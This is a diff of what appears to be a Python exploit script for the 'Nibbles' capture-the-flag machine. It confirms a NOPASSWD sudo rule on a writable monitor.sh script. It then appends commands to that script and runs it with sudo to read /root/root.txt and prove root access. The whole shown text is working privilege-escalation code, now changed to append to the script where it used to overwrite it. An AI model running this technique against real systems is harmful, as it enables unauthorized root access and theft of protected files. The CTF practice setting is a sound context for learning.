@@ -3,7 +3,6 @@
 import base64
 import http.cookiejar
 import os
-import shlex
 import socket
 import urllib.parse
 import urllib.request
@@ -114,18 +113,11 @@ output = run_php(
 )
 assert "monitor.sh" in output and "NOPASSWD" in output, output
 
-script_lines = [
-    "#!/bin/sh",
-    "id > /tmp/nibbles-native-root-proof",
-    "cat /root/root.txt > /tmp/nibbles-native-root-answer",
-    "chmod 0644 /tmp/nibbles-native-root-answer",
-]
-quoted_lines = " ".join(shlex.quote(line) for line in script_lines)
 command = (
-    "printf '%s\\n' " + quoted_lines +
-    " > /home/nibbler/personal/stuff/monitor.sh && "
-    "chmod 0755 /home/nibbler/personal/stuff/monitor.sh && "
-    "echo BEFORE_SUDO && "
+    "printf '\\n/usr/bin/id > /tmp/nibbles-native-root-proof"
+    "\\n/usr/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer"
+    "\\n/bin/chmod 0644 /tmp/nibbles-native-root-answer\\n' "
+    ">> /home/nibbler/personal/stuff/monitor.sh && "
     "sudo -n /home/nibbler/personal/stuff/monitor.sh 2>&1; "
     "echo SUDO_STATUS:$?; "
     "echo ROOT_PROOF; cat /tmp/nibbles-native-root-proof 2>&1; "
